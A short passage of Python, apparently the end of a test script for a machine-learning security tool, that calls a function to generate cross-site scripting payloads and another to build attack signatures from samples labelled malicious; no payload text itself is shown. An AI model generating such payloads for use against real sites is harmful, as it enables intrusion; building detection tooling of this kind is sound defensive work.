    payloads = generate_intelligent_payloads("xss", 3, "medium")
    print(f"Generated intelligent payloads: {payloads}")
    
    # Test attack signature generation
    signatures = generate_attack_signatures([p['payload'] for p in sample_data if p['label'] == 'malicious'])
    print(f"Generated signatures: {len(signatures)} categories")
    
    print("Comprehensive ML system testing completed!")
